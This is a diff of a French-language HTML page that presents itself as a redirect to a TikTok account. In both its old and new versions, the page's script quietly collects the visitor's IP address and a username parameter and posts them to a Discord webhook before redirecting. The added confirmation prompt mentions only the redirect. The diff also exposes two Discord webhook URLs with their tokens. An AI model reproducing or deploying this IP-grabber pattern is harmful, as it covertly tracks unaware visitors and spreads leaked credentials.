@@ -3,44 +3,44 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TikTok Redirect</title>
+    <meta name="robots" content="noindex, nofollow">
+    <title>Redirection...</title>
     <style>
-        body { font-family: Arial, sans-serif; text-align: center; padding-top: 50px; background-color: #f0f0f0; }
-        #message { font-size: 18px; color: #333; }
+        body { margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; background-color: #000; }
+        #message { color: #fff; font-family: Arial, sans-serif; font-size: 20px; }
     </style>
 </head>
 <body>
     <div id="message">Redirection vers @jules54.0 en cours...</div>
-
     <script>
-        // Récupérer l'IP via une API publique
-        fetch('https://api.ipify.org?format=json')
-            .then(response => response.json())
-            .then(data => {
-                const ip = data.ip;
-                let username = "No username";
-                if (window.location.search) {
-                    const params = new URLSearchParams(window.location.search);
-                    username = params.get('username') || "No username";
-                }
-
-                // Envoyer les données au webhook Discord
-                const webhookUrl = "https://discord.com/api/webhooks/1425204754002481204/T17pBY17O4VLlh2NlQFrrKfTkOJyCP-xGEzvGGjXLxpDu4m0ocxq6lXvii6AEFhmI4c3";
-                const message = {
-                    content: `**New Visitor** (${new Date().toLocaleString()})\n**IP**: ${ip}\n**Username**: ${username}`
-                };
-                fetch(webhookUrl, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(message)
-                }).catch(error => console.log("Webhook error:", error));
-            })
-            .catch(error => console.log("IP fetch error:", error));
-
-        // Rediriger vers ton TikTok après 2 secondes
-        setTimeout(() => {
-            window.location.href = "https://www.tiktok.com/@jules54.0";
-        }, 2000);
+        if (confirm("Voulez-vous être redirigé vers @jules54.0 ?")) {
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    const ip = data.ip;
+                    let username = "No username";
+                    if (window.location.search) {
+                        const params = new URLSearchParams(window.location.search);
+                        username = params.get('username') || "No username";
+                    }
+                    const webhookUrl = "https://discord.com/api/webhooks/1425240341899907085/70FL_sWXfK6_WCVZXQStwKTo2eDzt6WoXhvMu6LbqqQF6_eD8x-kRdE9VAgtoP1mAPRc";
+                    const message = {
+                        content: `**New Visitor** (${new Date().toLocaleString()})\n**IP**: ${ip}\n**Username**: ${username}`
+                    };
+                    fetch(webhookUrl, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(message)
+                    }).catch(error => console.log("Webhook error:", error));
+                    window.location.href = "https://www.tiktok.com/@jules54.0";
+                })
+                .catch(error => {
+                    console.log("IP fetch error:", error);
+                    window.location.href = "https://www.tiktok.com/@jules54.0";
+                });
+        } else {
+            document.getElementById("message").innerText = "Redirection annulée.";
+        }
     </script>
 </body>
 </html>
